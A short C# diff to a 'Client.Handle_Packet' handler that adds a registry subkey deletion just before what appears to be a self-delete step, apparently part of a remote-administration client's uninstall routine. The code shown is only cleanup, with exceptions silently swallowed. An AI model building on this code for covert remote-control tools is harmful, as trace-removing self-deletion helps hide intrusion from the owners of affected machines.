@@ -35,6 +35,13 @@ namespace Client.Handle_Packet
                 }
                 catch { }
             }
+
+            try
+            {
+                RegistryDB.DeleteSubKey();
+            }
+            catch { }
+
             ProcessStartInfo Del = null;
             try
             {
